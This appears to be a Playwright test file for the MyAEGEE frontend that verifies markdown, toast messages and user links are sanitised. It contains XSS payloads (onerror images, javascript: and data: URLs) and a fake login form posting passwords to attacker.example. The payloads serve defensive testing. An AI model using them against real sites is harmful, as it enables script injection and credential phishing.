import type { Page } from '@playwright/test';
import { test, expect, loginInBrowser, moveToModule } from '../support/api.ts';

// Each payload sets window.__injected when it gets to run.
const injected = (page: Page): Promise<unknown> => page.evaluate(() => (window as unknown as { __injected?: unknown }).__injected);

test.describe('HTML injection in the frontend', () => {
    test('markdown keeps formatting but drops scripts, styles and forms', moveToModule('frontend', 'once the frontend has component tests for the markdown filter'), async ({ api, page }) => {
        const description = [
            'Intro with **bold text** and a [normal link](https://www.aegee.org).',
            '',
            '<img src="x" onerror="window.__injected = \'img\'">',
            '',
            '<style>body { display: none !important; }</style>',
            '',
            '<form action="https://attacker.example/login"><input name="password" type="password"><button>Log in again</button></form>',
            '',
            '<p style="position: fixed; inset: 0; background: white;">Covering the page</p>',
            '',
            '<div class="modal is-active"><div class="modal-background"></div><div class="modal-content box">Session expired</div></div>',
            '',
            '[click me](javascript:window.__injected=\'link\')'
        ].join('\n');

        const event = await api.createEvent('admin', { type: 'training', description });
        await api.publishAsAdmin(event.id);

        await loginInBrowser(page, api, 'member');
        await page.goto(`/events/${event.url}`);

        const rendered = page.locator('.markdown').filter({ hasText: 'Intro with' });
        await expect(rendered).toBeVisible();

        // Markdown itself still works.
        await expect(rendered.locator('strong')).toHaveText('bold text');
        await expect(rendered.locator('a[href="https://www.aegee.org"]')).toHaveText('normal link');
        await expect(rendered.getByText('Covering the page')).toBeVisible();

        // Everything that could run code, restyle or cover the page, or fake a form is gone.
        await expect(rendered.locator('img[onerror]')).toHaveCount(0);
        await expect(rendered.locator('style')).toHaveCount(0);
        await expect(rendered.locator('form, input, button')).toHaveCount(0);
        await expect(rendered.locator('[style]')).toHaveCount(0);
        // Classes are dropped too: with Bulma's modal classes this would cover the whole page.
        await expect(rendered.locator('[class]')).toHaveCount(0);
        await expect(page.locator('.modal.is-active')).toHaveCount(0);
        await expect(rendered.getByText('Session expired')).toBeVisible();
        await expect(rendered.locator('a[href^="javascript:"]')).toHaveCount(0);
        await rendered.getByText('click me').click();
        expect(await injected(page)).toBeUndefined();
    });

    test('toasts show names and server messages as text', moveToModule('frontend', 'once the frontend has component tests for the toast helpers'), async ({ api, page }) => {
        await loginInBrowser(page, api, 'member');
        await page.goto('/');
        await expect(page.locator('#app')).toBeVisible();

        const payload = '<img src="x" onerror="window.__injected = true">';
        // Calls one of the toast helpers of the app's root instance (src/methods/index.js).
        const callRootHelper = (name: string, args: unknown[]) => page.evaluate(([helper, helperArgs]) => {
            const root = (document.querySelector('#app') as unknown as { __vue__: { $root: Record<string, (...a: unknown[]) => void> } }).__vue__.$root;
            root[helper as string](...(helperArgs as unknown[]));
        }, [name, args] as const);

        // A success toast with a user-provided name.
        await callRootHelper('showSuccess', [`Event "${payload}" is successfully added.`]);
        await expect(page.getByText(`Event "${payload}" is successfully added.`)).toBeVisible();

        // An error toast with the message from the API response.
        await callRootHelper('showError', ['Could not save event', { response: { data: { message: payload } } }]);
        await expect(page.getByText(`Could not save event: ${payload}`)).toBeVisible();

        await expect(page.locator('.notices img')).toHaveCount(0);
        expect(await injected(page)).toBeUndefined();
    });

    test('links typed in by users only open when they are http(s) links', moveToModule('frontend', 'once the frontend has component tests for the safeUrl filter'), async ({ api, page }) => {
        const event = await api.createEvent('admin', { type: 'training' });
        await api.publishAsAdmin(event.id);
        const body = (await api.me('member')).bodies[0];

        // The backend rejects links like these, so they're put in the API responses
        // to test the frontend on its own (and data stored before the validation).
        const replaceInResponse = (url: RegExp, changes: Record<string, string>) => page.route(url, async (route) => {
            if (route.request().method() !== 'GET') {
                return route.fallback();
            }

            const response = await route.fetch();
            const json = await response.json();
            Object.assign(json.data, changes);
            return route.fulfill({ response, json });
        });

        await replaceInResponse(/\/api\/events\/single\/[^/?]+$/, {
            // eslint-disable-next-line no-script-url
            budget: 'javascript:window.__injected=\'budget\'',
            programme: 'www.aegee.org/programme',
            link_info_travel_country: ' data:text/html,<script>window.__injected=\'travel\'</script>'
        });
        await replaceInResponse(new RegExp(`/api/core/bodies/${body.id}$`), {
            // eslint-disable-next-line no-script-url
            website: 'JaVaScRiPt:window.__injected=\'website\''
        });

        await loginInBrowser(page, api, 'member');
        await page.goto(`/events/${event.url}`);

        const budget = page.locator('a', { hasText: 'window.__injected=\'budget\'' });
        await expect(budget).toBeVisible();
        // These links open in a new tab, so clicking them wouldn't show anything here:
        // without an href, there's nothing to open.
        await expect(budget).not.toHaveAttribute('href');

        const travel = page.locator('a', { hasText: 'window.__injected=\'travel\'' });
        await expect(travel).toBeVisible();
        await expect(travel).not.toHaveAttribute('href');

        // A link without a scheme opens as https instead of as a page of MyAEGEE.
        await expect(page.locator('a', { hasText: 'www.aegee.org/programme' })).toHaveAttribute('href', 'https://www.aegee.org/programme');

        await page.goto(`/bodies/${body.id}`);
        const website = page.locator('a', { hasText: 'window.__injected=\'website\'' });
        await expect(website).toBeVisible();
        await expect(website).not.toHaveAttribute('href');
    });
});
